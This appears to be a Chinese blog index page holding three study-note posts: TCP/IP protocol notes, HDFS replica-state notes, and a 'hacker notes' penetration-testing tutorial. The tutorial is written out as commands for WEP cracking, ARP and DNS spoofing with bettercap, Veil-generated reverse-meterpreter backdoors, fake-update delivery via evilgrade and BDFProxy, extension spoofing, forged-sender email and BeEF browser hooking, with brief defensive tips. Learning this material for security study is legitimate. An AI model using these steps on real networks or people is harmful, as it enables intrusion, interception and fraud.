+<h2 id="6-2msl等待"><a href="#6-2msl等待" class="headerlink" title="6.  2msl等待"></a>6.  2msl等待</h2><p>在四次挥手时，由于第三次挥手时，如果客户端的消息丢失，服务端不知道客户端有没有收到服务端的消息，分为两种情况：收到了，但是第四次的消息丢失和根本没收到，所以客户端会等待2msl的时间，通常为30秒，1min或2min。这个期间同一个socket不会被其他应用占据。这段时间被称为平静时间</p>
+<h2 id="7-复位报文段"><a href="#7-复位报文段" class="headerlink" title="7. 复位报文段"></a>7. 复位报文段</h2><p>TCP首部中的RST比特用户复位。UDP在到达目的端口时，会茶农一个ICMP不可达信息。TCP则使用复位。<br>使用telnet测试会发现，第一个报文和三次握手中第一次SYN置1的报文一样，但是返回的报文则是ACK没有被置1，复位报文段的序号被置为0。</p>
+<h2 id="8-异常终止链接"><a href="#8-异常终止链接" class="headerlink" title="8.异常终止链接"></a>8.异常终止链接</h2><p>异常终止一个连接，如果本端发生异常，无法正常关闭(发送fin消息)，则只能发送rst消息。这样做有2个好处，本端丢弃未发送的数据；rst接收方可以区分是正常关闭还是异常关闭。<br>使用rst的时候，服务端会收到”connection rest by peer的提示“</p>
+<h2 id="9-检测半打开的链接"><a href="#9-检测半打开的链接" class="headerlink" title="9. 检测半打开的链接"></a>9. 检测半打开的链接</h2><p>检测半打开连接，比如服务端已经关闭(异常关闭，如机器重启，或fin消息丢掉)，而客户端并不知道服务端已经关闭，所以这个时候，客户端则处于半打开连接，如果这个时候客户端又向服务端发送数据，由于服务端已经断开连接(如重启机器)，并不知道这个数据从哪来的，先前没有经过3次握手建立连接，则只能回复rst消息，告知客户端异常关闭。客户端会收到“Connection closed by foreign host”</p>
+<h2 id="10-同时打开"><a href="#10-同时打开" class="headerlink" title="10. 同时打开"></a>10. 同时打开</h2><p>如果两端同时打开，则会发送4个报文，并且知道这是同一个socket。此时不再区分服务端和客户端。<br><img src="https://img-my.csdn.net/uploads/201210/30/1351592710_8294.JPG" alt=""></p>
+<h2 id="11-同时关闭"><a href="#11-同时关闭" class="headerlink" title="11. 同时关闭"></a>11. 同时关闭</h2><p><img src="https://img-my.csdn.net/uploads/201210/30/1351592761_9080.JPG" alt=""><br>同样发送4个报文</p>
+<p>##12. TCP选项</p>
+<p>##13. TCP服务器</p>
+<ul>
+<li>TCP服务器的端口号<br>  netstat -a -n -f inet<br>可以查看 所有（-a)的 点十分位（-n)显示的使用TCP、UDP的（-f inet)主机<br>可以看到，要是有同时连接到服务器的连接，他们的foreign address的端口是不一样的。也即是说，socket是个四元组，由于端口号不同，不会发生冲突。<h2 id="14-呼入连接请求队列"><a href="#14-呼入连接请求队列" class="headerlink" title="14.呼入连接请求队列"></a>14.呼入连接请求队列</h2>三次握手成功是个及时操作，系统不可能紧盯着它等处理。那服务器繁忙时，有连接到了怎么办？很简单，排队，等有空了挨个处理。</li>
+</ul>
+<p>　　“呼入请求队列”便是这个。需要注意的：客户端connect成功，仅仅只表示被放入了svr的呼入请求队列（此时client仍能发数据，收的数据被放在tcp缓存了），还未交接给应用层。svr端Accept时才会将队列中的连接取出，进而处理。</p>
+<p>　　PS：如果不取或取慢了，client会因tcp发送缓冲满而一直send失败。所以怎么调Accept也是要考虑设计的</p>
+<p>　　PPS：“呼入请求队列”有长度限制（积压值 backlog），超过后再来的连接请求就一直失败了。</p>
+<h1 id="19章-TCP的交互数据流"><a href="#19章-TCP的交互数据流" class="headerlink" title="19章 TCP的交互数据流"></a>19章 TCP的交互数据流</h1><p>有关TCP通信量的研究发现：按分组数量计算，约有一半的TCP报文段包含成块数据（如FTP、电子邮件和Usenet新闻），另一半则包含交互数据（如Telnet和Rlogin）。按字节计算，成块数据与交互数据的比例约为90%和10%。</p>
+<p>成块数据的报文段基本上都是满长度的（通常为512字节的用户数据），交互数据则小得多（Telnet和Rlogin分组中约90%左右的用户数据小于10个字节）</p>
+<p>TCP需要同时处理这两类数据，但使用的处理算法不同。</p>
+<p><a href="!https://blog.csdn.net/weixin_33701251/article/details/93315311">参考笔记</a></p>
+<h2 id="滑动窗口协议"><a href="#滑动窗口协议" class="headerlink" title="滑动窗口协议"></a>滑动窗口协议</h2><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p><img src="https://img2020.cnblogs.com/blog/1366679/202009/1366679-20200910072426785-2116653367.png" alt=""><br>为什么要滑动窗口：<br>提高传输效率</p>
+<h3 id="如何改进滑动窗口协议"><a href="#如何改进滑动窗口协议" class="headerlink" title="如何改进滑动窗口协议"></a>如何改进滑动窗口协议</h3><p>SR协议：在收取方也添加缓存机制，通过窗口批量返回和交给上层</p>
+<h2 id="TCP如何提供可靠服务"><a href="#TCP如何提供可靠服务" class="headerlink" title="TCP如何提供可靠服务"></a>TCP如何提供可靠服务</h2><ul>
+<li>流水线机制</li>
+<li>重传机制</li>
+<li>单一重传定时器</li>
+</ul>
+<p>##如何设置重传时间？</p>
+<ul>
+<li>大于RTT<br>但是RTT不是常量</li>
+<li>使用移动加权法计算RTT<br>先观测sampleRTT,然后计算estimatedRTT<br>$$ estinatedrtt = (1 - alpha) <em> estimatedRTT + appha </em> sampleRTT$$<br>典型值：0.125</li>
+</ul>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">网络</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/02/01/TCP-IP笔记/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-黑客笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/07/10/黑客笔记/">黑客笔记</a>
+    </h1>
+  
+
+        
+        <a href="/2020/07/10/黑客笔记/" class="archive-article-date">
+  	<time datetime="2020-07-10T11:43:56.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-10</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>[toc]</p>
+<h2 id="网络入侵"><a href="#网络入侵" class="headerlink" title="网络入侵"></a>网络入侵</h2><h3 id="1-1-前期准备"><a href="#1-1-前期准备" class="headerlink" title="1.1 前期准备"></a>1.1 前期准备</h3><p>购买了Atheros 7291的无线网卡，插入到kali Linux上，执行以下命令启动网卡的启动监听模式：</p>
+<pre><code>ifconfig wlan0 down
+airmon-ng check kill
+iwconfig wlan0 monitor #启动监听模式
+ifconfig wlan0 up
+</code></pre><h3 id="1-2-破解网络"><a href="#1-2-破解网络" class="headerlink" title="1.2 破解网络"></a>1.2 破解网络</h3><p>####1.2.1 破解WEP秘钥</p>
+<ul>
+<li>破解原理<br>WEP网络发送的每一个包都经过加密形成Key Stream<br>Key Stream由24bit的ramdom initializaiton vector(IV)+password生成。</li>
+<li><p>攻击方式<br>捕获网络上的包，如果没有包，就进行arp replay,迫使目标路由器和我们握手，从而捕获生成的握手包</p>
+<pre><code># Fake Athentication Attack 0 一次
+aireplay-ng --fakeauth 0 目标MAC -h 网卡MAC wlan0 
+# arp reqyest replay
+aireplay-ng --arpreplau 0 -b 目标mac -h 网卡mac wlan0
+# 从捕获到的包中获取key
+aircrack-ng arpreplay-01.cap
+</code></pre><p>####1.2.2 破解WPA/WPA2秘钥</p>
+</li>
+<li>破解原理</li>
+</ul>
+<ol>
+<li>基于WPS特性<br>WPS允许客户端在没有密码的情况下连接到网络认证只使用了8位的pin码，所以暴力破解pin码</li>
+<li>字典破解<br>如果网络的WPS特性关闭，只能使用字典攻击了。并且默认来说WPS都是关闭的，字典破解是更常用的方式。</li>
+</ol>
+<ul>
+<li>具体操作<br>###1.3 攻击方式拾遗</li>
+<li>Deauthentication Attack</li>
+<li>APR request Replay Attack</li>
+</ul>
+<h2 id="信息搜集和中间人攻击"><a href="#信息搜集和中间人攻击" class="headerlink" title="信息搜集和中间人攻击"></a>信息搜集和中间人攻击</h2><h3 id="2-1-Zenmap-amp-Nmap"><a href="#2-1-Zenmap-amp-Nmap" class="headerlink" title="2.1 Zenmap&amp;Nmap"></a>2.1 Zenmap&amp;Nmap</h3><p>使用zenmap的quick scan plus，可以获取网络中的设备，运行的操作系统，开放的端口，端口运行的软件。从而可以搜索对应软件存在的漏洞进行攻击。<br>例子：Iphone越狱后会开启22端口，可以远程ssh登录。root的默认密码是alpine，值得一试。</p>
+<p>###2.2 ARP spoof(ARP poision)<br>ARP欺骗，中间人攻击<br>因为ARP没有安全检验机制<br>使用arpspoof让目标机器以为攻击者的机器是路由器，让路由器以为攻击者的机器是目标机器。<br>先开启流量转发：</p>
+<pre><code>echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward
+命令：arpspoof -i 网卡名 -t 目标机器IP 让目标机器认为我们是谁的IP
+arp -a查看本地的arp表
+</code></pre><p>###2.3 bettercap 中间人攻击<br>也可用于arp欺骗，功能比arpspoof强大<br>命令：</p>
+<pre><code>bettercap -itface wlan0
+ 进入之后的命令：
+help帮助，能查看运行的模块
+net.probe给同一网段的设备发UDP请求
+，搜集设备信息，会自动开启net.recon
+查看搜集的结果：net.show
+开启arp欺骗：
+- set arp.spoof.fulduplex  true #让目标机器和路由器都认为我是中间人
+- set arp.spoof.targets 1.0.2.15 #目标机器
+- arp.spoof on
+-ney.sniff on开启监听，可以捕获所有的请求(吊爆了)
+</code></pre><p>可以把以上命令都写入脚本</p>
+<pre><code>bettercap -itface wlan0 caplet xxxxx.cap
+</code></pre><p>上述命令只能捕获未加密的HTTP请求，想获得HTTPS的信息，需要额外的步骤：</p>
+<pre><code>1. 下载htshjack解压到/usr/share/bettercap/caplets
+2. 脚本中，在开始sniff前增加
+set net.sniff.local true
+3.运行脚本即可开始捕获(吊爆了)
+</code></pre><p>###2.4 部分解决hsts问题<br>hsts：一部分网页</p>
+<h3 id="2-5-DNS欺骗"><a href="#2-5-DNS欺骗" class="headerlink" title="2.5 DNS欺骗"></a>2.5 DNS欺骗</h3><pre><code>1.先执行上述脚本，开启相关模块
+2. set dns.spoof.domain xxx 设置想要查访问的人骗到xxx去，不设置的话默认是网卡地址
+3.set dns.spoof.all true 是否把所有请求都骗过去
+set dns.spoof.domains xxx,xxx逗号分割的域名，访问xxx时会欺骗
+4.dns.spoof.on
+注入javascript脚本：
+1.同上，执行脚本，启动相关服务
+2.把js代码保存到foo.js
+3.打开hstshijack模块，修改hijack.cap
+4.在set hstshijack.payloads 之后增加*:/path/to/foo.js
+5.运行hijack模块: hstshijack/hstshijack
+</code></pre><h3 id="2-6Wireshark"><a href="#2-6Wireshark" class="headerlink" title="2.6Wireshark"></a>2.6Wireshark</h3><p>不是用来攻击的工具，只能监听本地网卡。但是通过arp欺骗。可以捕获别人的流量，从而分析监听别人的网络<br>简单使用：</p>
+<ul>
+<li>过滤http(绿色)</li>
+<li>查看http内容</li>
+<li>搜索http内容</li>
+</ul>
+<h3 id="2-7-把自己伪装成热点"><a href="#2-7-把自己伪装成热点" class="headerlink" title="2.7 把自己伪装成热点"></a>2.7 把自己伪装成热点</h3><p>伪装成热点后，对接入的victims自动成中间人<br>使用start-nat-simple.sh，再启动bettercap(另外的启动命令不实用，先忽略了)，或者使用wireshark抓包<br>使用工具mana</p>
+<ol>
+<li>编辑mana的配置文件/etc/mana-toolkit/hostapd-mana.conf，修改想要使用无线网卡名字，和ssid</li>
+<li>编辑启动文件/usr/share/mana-toolkit/run-mana/start-mana-simole.sh，修改phy为无线网卡，upstream为可以联网的另一个网卡</li>
+<li>运行</li>
+</ol>
+<h2 id="检测攻击"><a href="#检测攻击" class="headerlink" title="检测攻击"></a>检测攻击</h2><p>###3.1 检测arp欺骗：<br>1.使用XR工具<br>2.使用wireshark抓包<br>3.使用static arptable</p>
+<p>###3.2 防止中间人攻击：<br>1.使用https everywhere插件<br>2.使用vnp，vpn会加密。但是vpn提供商会获取你的全部通讯，所以要选择可信的供应商。</p>
+<p>##获取权限</p>
+<ul>
+<li>server side attack<br>只需要ip就可以进行攻击，使用端口扫描等</li>
+<li>client side attack<br>需要和服务器通信，上传，社会工程，引诱安装木马等</li>
+</ul>
+<h3 id="4-1-初体验"><a href="#4-1-初体验" class="headerlink" title="4.1 初体验"></a>4.1 初体验</h3><p>使用zenmap扫描端口，然后去谷歌搜索端口的漏洞，默认密码等，加以利用，本例使用了rlogin</p>
+<h3 id="4-2-metasploit"><a href="#4-2-metasploit" class="headerlink" title="4.2 metasploit"></a>4.2 metasploit</h3><p>由rapid7开发的渗透软件</p>
+<pre><code>msfcosole运行metasploit
+use /path/to/exploit 使用漏洞模块(可以在rapid7网站上搜索)
+show options显示选项，其中name对应的vakue可以通过options进行设置
+set xx xx设置选项
+exploit 执行漏洞
+# 本例使用了vstftp的后门(backdoor)，对21端口进行连接。能够连接ftp后执行代码
+</code></pre><h3 id="4-2-远程执行漏洞"><a href="#4-2-远程执行漏洞" class="headerlink" title="4.2 远程执行漏洞"></a>4.2 远程执行漏洞</h3><p>本例对运行在139端口的samba进行攻击</p>
+<pre><code>use xxxx
+show options
+set rhost 10.200.1.5
+show payloads(payloads意思是可执行的代码片段)
+</code></pre><ul>
+<li>payloads有两类，一类是命名为bind_xxx的，是在目标机器上开启端口并与其通讯。reverse_xx的是在自己机器上开启端口，让远程机器与自己通讯。优点是不会被目标机器的防火墙拦截。<br>可以把自己的端口设置成80让远程机器再访问浏览器呢</li>
+</ul>
+<h3 id="4-3-nexpose"><a href="#4-3-nexpose" class="headerlink" title="4.3 nexpose"></a>4.3 nexpose</h3><p>同样为rapid7开发的渗透工具，可以检测更大范围的漏洞，并且汇报给对应的人员</p>
+<pre><code>安装
+1下载
+2service stop postgresql
+3赋予执行权限
+4执行安装
+</code></pre><ul>
+<li><p>安装过程中，如果遇到不支持kali1，需要kali2的问题，需要升级lunix的/etc/lsb-release和/etc/os-release，先备份，修改自己的版本为kali2，安装完成后再恢复备份</p>
+</li>
+<li><p>安装后可以用来扫描所有漏洞，自动在rapid7上发现攻击方法，生成报告</p>
+</li>
+</ul>
+<h3 id="4-4-Client-side-attack"><a href="#4-4-Client-side-attack" class="headerlink" title="4.4 Client side attack"></a>4.4 Client side attack</h3><p>apt-get install veil</p>
+<h3 id="4-5-veil用于给系统留后门"><a href="#4-5-veil用于给系统留后门" class="headerlink" title="4.5 veil用于给系统留后门"></a>4.5 veil用于给系统留后门</h3><p>运行之后可以看到evasion模块<br>evasion模块命名一般为<br>语言名/payload名/rev</p>
+<p>例子:<br>go/meterpreter/rev_http</p>
+<ul>
+<li>带rev的意思是受害者连接本地</li>
+</ul>
+<p>例子：使用veil留后门</p>
+<p>运行后执行：</p>
+<pre><code>list  #列出所有可用的工具
+use 1 #使用1 ecasion
+use 15 #使用15 go的http——rev
+ifconfig #查看kali的的ip
+set LHOST ${kali_ip}   
+set LPORT ${kali_port}
+set PROCESSORS 1 #使用的最小cpu数
+set SLEEP 6 #睡眠6秒
+
+# 然后生成backdoor:
+generate
+# 命名之后可以获得exe文件
+</code></pre><h3 id="4-6-使用metaexplit监听来自veil的连接"><a href="#4-6-使用metaexplit监听来自veil的连接" class="headerlink" title="4.6 使用metaexplit监听来自veil的连接"></a>4.6 使用metaexplit监听来自veil的连接</h3><pre><code>go/meteptrter/rev_htps,port 8080
+msfconsole
+use exploit/multi/handler #监听incoming connections
+show options
+set LHOST
+set LPORT
+set payload windows/meterpreter/reverse_https  # &lt;-payload和veil中使用的保持一致
+</code></pre><ul>
+<li>/var/wwww/html中储存kali作为服务器时可以下载的内容</li>
+</ul>
+<p>###4.7 诱导victim安装后门：</p>
+<pre><code>#启动
+cd opt/evilgrade
+./evilgrade
+
+show modules
+#可以看到很多软件的虚假升级组件
+
+configure [module_name] #（设置module_name的配置）
+show options #其中的virtualHost是该模块的域名，使用dns欺骗的时候要替换成改属性，本例是update.speedit.com
+set agent /var/www/html/backdoor.exe #设置后门的路径
+set endsite 222.speedbit.com #设置升级之后返回的页面
+start
+
+#开始等待连接了
+
+
+#然后需要成为中间人
+
+bettercap -iface eth0 -caplet /path/to/script
+set dns.spoof.all true
+set dsn.spoof.domain update.speedit.com
+set dns.spoof on
+</code></pre><p>受害人如果更新该软件就会上钩</p>
+<h3 id="4-7plus-另一种让受害人上钩的方法"><a href="#4-7plus-另一种让受害人上钩的方法" class="headerlink" title="4.7plus 另一种让受害人上钩的方法"></a>4.7plus 另一种让受害人上钩的方法</h3><pre><code>/opt/BDFProxy
+
+# 更改cfg：
+proxyMode:transparent
+# 更改配置文件中的HOST为本机IP（本例想对windows系统进行攻击，所以选择[[ windowsIntelx86]] [[windowsx64]]对应的配置）
+# 执行bdf_proxy.py
+
+# 成为中间人进行arp欺骗
+bettercap -iface eth0 -caplet /path/to/script
+
+#配置本地的防火墙转发规则
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080 #-t 表名 -A append -p package类型
+#把访问80的请求转发到8080
+msfconsole --resource /opt/BDFProxy/bdfproxy_msf_resource.rc
+#如果下载内容则会连接到msfconsole
+</code></pre><p>###4.8 如何防范攻击</p>
+<ul>
+<li>确定没有中间人</li>
+<li>只从http下载</li>
+<li>检查下载文件的MD5文件</li>
+</ul>
+<h2 id="基于社会工程学搜集密码"><a href="#基于社会工程学搜集密码" class="headerlink" title="基于社会工程学搜集密码"></a>基于社会工程学搜集密码</h2><h3 id="5-1-使用工具：maltego"><a href="#5-1-使用工具：maltego" class="headerlink" title="5.1 使用工具：maltego"></a>5.1 使用工具：maltego</h3><ul>
+<li>拖拽人物，网站等建立transformation，自动挖掘个人信息</li>
+</ul>
+<h3 id="5-2-使用Autoit"><a href="#5-2-使用Autoit" class="headerlink" title="5.2 使用Autoit"></a>5.2 使用Autoit</h3><p>把脚本伪装成任意文件，脚本先下载图片，再下载木马，直接执行看起来就是打开了一个图片。<br>使用rw-desinger(网页)把图片转成icon，让木马看起来像是图片</p>
+<p>###5.3 使用characters伪装扩展名</p>
+<p>使用right ro left extension<br>光标后面的内容会被反过来复制成一个字符<br>文件名以(ex结尾为妙，比如hex,sex)<br>有的浏览器会去掉反写，所以最好把文件压缩一下再发送</p>
+<p>###5.4 使用senditblue网站发送假邮件<br>1.先去senditblue注册<br>2.在kali使用sendemail<br>3.sendemail –help<br>4.设置用户名，密码等<br>    sendemail -u [在senditblue注册的邮箱] -xp 密码 -s smtp-relapu.senditblue.com:5787(服务器) -t “<a href="mailto:m.astarg@isecurity.com" target="_blank" rel="noopener">m.astarg@isecurity.com</a>“(收件人) -f “<a href="mailto:zaid@isecurity.com" target="_blank" rel="noopener">zaid@isecurity.com</a>“(发件人,在发件人处伪装发件人) -u [邮件标题] -m [邮件内容] -o message-header “From: Mohanmmad Askar <a href="mailto:&#x6d;&#x2e;&#97;&#x73;&#116;&#x61;&#x72;&#x67;&#64;&#105;&#115;&#x65;&#x63;&#117;&#114;&#x69;&#116;&#121;&#x2e;&#x63;&#111;&#109;" target="_blank" rel="noopener">&#x6d;&#x2e;&#97;&#x73;&#116;&#x61;&#x72;&#x67;&#64;&#105;&#115;&#x65;&#x63;&#117;&#114;&#x69;&#116;&#121;&#x2e;&#x63;&#111;&#109;</a>“(邮箱里显示的姓名）</p>
+<h2 id="获取权限-ex"><a href="#获取权限-ex" class="headerlink" title="获取权限-ex"></a>获取权限-ex</h2><h3 id="6-1-beEf"><a href="#6-1-beEf" class="headerlink" title="6.1 beEf"></a>6.1 beEf</h3><p>基于js的钩子，能让上钩的人在beEf控制台被控制</p>
+<ul>
+<li>常用方法</li>
+</ul>
+<ol>
+<li>基于中间人：使用之前的方法，使用bettercap成为中间人并注入js代码</li>
+<li>DNS欺骗，如以前的方法，返回假页面</li>
+<li>社会工程，诱导打开页面</li>
+</ol>
+<ul>
+<li>BeEF基本操作<br>界面上都有，自己看吧，截屏，摄像头什么的<br>举例：</li>
+</ul>
+<ol>
+<li>发送假的session time out页面进行社会工程学偷密码</li>
+<li>发送假的升级信息，连接指向之前制作的木马软件</li>
+</ol>
+<h3 id="6-2-如何防止木马："><a href="#6-2-如何防止木马：" class="headerlink" title="6.2 如何防止木马："></a>6.2 如何防止木马：</h3><ol>
+<li>右键查看详情检查文件类型</li>
+<li>查看电脑进程有没有可疑的，了解到不明ip的，搜索ip使用reverse dns(网上的服务)</li>
+<li>使用sandbox(沙箱环境)，模拟运行，也可以使用网上的服务(比如hybrid-analysis.com)</li>
+</ol>
+<h2 id="综合练习"><a href="#综合练习" class="headerlink" title="综合练习"></a>综合练习</h2><h3 id="7-1-综述"><a href="#7-1-综述" class="headerlink" title="7.1 综述"></a>7.1 综述</h3><ul>
+<li>由于在内网的设备的IP不暴露到公网，需要在网络的路由器上设置转发，才能让上钩的受害者连接到本地<h3 id="7-2-步骤"><a href="#7-2-步骤" class="headerlink" title="7.2 步骤"></a>7.2 步骤</h3></li>
+</ul>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">安全</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/07/10/黑客笔记/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-大数据笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/09/10/大数据笔记/">大数据笔记</a>
+    </h1>
+  
+
+        
+        <a href="/2018/09/10/大数据笔记/" class="archive-article-date">
+  	<time datetime="2018-09-10T11:10:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-10</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>#Week1</p>
+<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><ul>
+<li>什么是scaling up ，什么是Scaling out？<br>scaling up又称为纵向扩展，是扩大机器的容量，scaling out又称为水平扩展，是把数据存储到多个节点</li>
+<li>hdfs中的节点都有什么角色？<pre><code>- NameNode
+- DataNode
+</code></pre></li>
+<li>hdfs上的数据存放是怎么存的？<br>同一机器上的数据，距离为0<br>同一机架上的数据，距离为2<br>同一机房的其他机架数据，距离为4<br>其他机房，距离为6</li>
+<li>chunk/block size是什么？</li>
+<li><p>hdfs的客户端是怎么读写数据的？<br>客户端先访问namenode，获取数据存在哪个datanode上，再从datanode读写</p>
+</li>
+<li><p>GFS文件系统的三大主要内容</p>
+<pre><code>- components failures are a norm (→ replication)
+- even space utilisation
+- write-once-read-many
+</code></pre></li>
+</ul>
+<h2 id="Block-Replica-State-Recovery-Process"><a href="#Block-Replica-State-Recovery-Process" class="headerlink" title="Block,Replica State,Recovery Process"></a>Block,Replica State,Recovery Process</h2><ul>
+<li>什么是Replica<br>Replica是DataNode中存储数据的单位，在DataNode上有很多Replica<br>-Replica的常见状态<pre><code>- Finalized ，处于finalized状态的replica已经完成了其所有字节的写，replica的内容和长度都已固定，除非此replica响应append事件来reopen继续追加写，否则此replica不会被写入新的字节。并且，这种类型的replica其真实的replica data和meta data是相匹配的。此replica的存储在其余DN的备份也有着相同的block id和字节。但是有一点需要注意，这种replica的时间戳GS(generation stamp)不是一成不变的，当进行错误块恢复的时候，有可能会发生变化(变为块恢复时的时间)。
+- RBW ，RWB是Replica Being Written to的缩写，一旦一个replica被创建或者之前的replica被追加数据，那么此replica就会变为RWB状态，这意味着这个replica正在被写入数据(是现在进行时哦，亲！)。这个块通常是一个正在被操作的文件(文件流未被关闭)的最后一个块。正因为处在“被写入数据”的状态，所以此replica的长度还未 确定，并且存储在磁盘上的此块的replica data和meta data也不一定是匹配的。此块的存储在其余DN上的replica可能有着不同的字节内容和长度。但是，此块的数据还是能够被reader看到的(读到的不一定是所有的数据)。为了防止意外，处于RWB状态的replica也要尽可能的持久化。
+- RWR是Replica Waiting to be Recovered的缩写，当DN死掉或者重启的时候，所有上述属于RBW状态的replica都会变成RWR状态。RWR状态的replica不会出现在传输数据的pipeline(通道，读和写等操作中，用此来进行传输block)中，因此也不会接收任何新的字节写入。这些状态的replica最终要么变为过期的数据，要么当客户端挂掉的时候参与到租约恢复中去
+- 当一个租约(客户端向NN申请的对一个文件的控制)过期并且发起包括此replica的块恢复机制之后，这个replica就会变为RUR状态，RUR就是Replica Under Recovery的缩写。
+- 顾名思义，这个Temporary的replica就是处于under construction的块，它是当块复制或者集群做均衡操作时创建的临时块。这种状态的块和RBW状态的块有很多类似的地方，但是有一点显著的不同，就是其数据是不能被reader看到的。当块创建失败或者DN重启的时候，此状态的replica都会被删除掉。
+</code></pre>-在DN端的硬盘存储的层次上，有三个子目录：current、tmp、rbw。current用来存储处于finalized状态的replica，tmp用来存储temporary状态的replica，rbw用来存储rbw、rur、rwr状态的replica。并且：</li>
+</ul>
+<p>(1)当块被客户端请求首次创建的时候，会被放入rbw目录下;</p>
+<p>(2)当块是因为复制或者均衡操作被创建的时候，会被放入tmp目录;</p>
+<p>(3)一旦一个块被finalized，就被移动到current目录;</p>
+<p>(4)当数据节点重启时，tmp目录下的replica就被清空，rbw目录下的replica就转变为rwr状态，current目录下的replica变为finalized状态;</p>
+<p>(5)当DN升级的时候，current和rbw目录下的块都会被保存在快照中。</p>
+<p>!()[<a href="https://images0.cnblogs.com/blog/392365/201305/30200928-0ede4fa514444ef6bcfd5ff4e4870cdb.jpg]" target="_blank" rel="noopener">https://images0.cnblogs.com/blog/392365/201305/30200928-0ede4fa514444ef6bcfd5ff4e4870cdb.jpg]</a></p>
+<ul>
+<li><p>什么是Block<br>Block是NameNode中的单位，存储着管理DataNode的信息（位置，状态等）</p>
+</li>
+<li><p>Block的状态保存在内存中</p>
+</li>
+<li><p>UnderConstruction状态<br>一旦一个块被创建或者被追加数据，就会处于underConstruction状态，此时，数据库正在被写入新的数据。这样的块是当前正处于被写状态的文件的的最后一个块。它的块长度和GS都还没有最终确定，同DN端的rwb状态一样，此数据块对reader来说是可见的。并且，此类型的块还会保持对写入其本身的数据通道和对应的RWR状态的replica的追踪，以防Client挂掉。</p>
+</li>
+<li><p>UnderRecovery状态<br>  当一个文件的租约过期时，如果此文件的最后一个block处于underConstruction状态，此块就会当块恢复开始的时候变为underRecovery状态。</p>
+</li>
+<li>Committed状态<br>  一个处于committed状态的block，其内容和时间戳GS都已经确定，但是在DN中还没有一个replica和此committed的block有着相同的字节和GS。除非进行append追加操作，否则此committed状态的block的字节和GS都不会再发生变化。为了响应reader的请求，committed状态的block仍然会持有rbw状态的replica的地址和追踪已经变为finalized状态的replica的长度和GS。当客户端调用NN的close file或add new block时，操作流未关闭的文件的处于underConstruction状态的replica会被转变为committed状态。如果最后一个block处于committed状态，那么此block对应的文件是无法被关闭的，客户端必须要重试。AddBlock和close将会扩展到包含最后一个block的GS和长度。</li>
+<li>Complete状态<br>一个处于complete状态的block，其长度和GS都是确定的，并且NN能够找到DN端GS和长度都对应的处于finalized状态的replica。Complete状态的block值会保持finalized状态的replica的地址。只有当所有的块都变为complete状态了，对应的文件才能被关闭。<br>和DN端的replica的状态不同，NN端的block的状态不会被持久化到磁盘上，当NN重启的时候，未关闭的文件的最后一个block会变为underConstruction状态，其余的块都变为complete状态。</li>
+</ul>
+<p>!()[<a href="https://images0.cnblogs.com/blog/392365/201305/30200957-c1463d3c038746df8e3eb860389e05db.jpg]" target="_blank" rel="noopener">https://images0.cnblogs.com/blog/392365/201305/30200957-c1463d3c038746df8e3eb860389e05db.jpg]</a></p>
+<ul>
+<li>恢复过程<pre><code>- 租约恢复，客户端向hdfs写入时，hdfs维护一个租约，本质上是一把写锁，只允许一个客户端写入。并且会不时的确认租约的存活，客户端是否挂掉。写入完成后才释放锁，别的客户端才可以继续写。这意味着同一时间只有一个客户端可以写数据
+- Block恢复，Block恢复只会发生在租约恢复的期间。在pipeline把数据写入不同的DataNode时，最后一个正在被写入的Repilca的数据并不一定一致，为了保证一致性，如果此时文件的写操作被租约关闭以外的操作关闭，就需要进行Block恢复。
+- pipeline恢复，在pipeline之间的数据进行写操作时，可能出现错误，此时需要对pipline进行恢复
+</code></pre></li>
+</ul>
+<p>小结：</p>
+<ul>
+<li>画出replica和block的状态图</li>
+<li>解释write pipeline的各个阶段(请结合recovery process)</li>
+<li><p>recovery process都有哪些？它们的目的分别是什么？</p>
+</li>
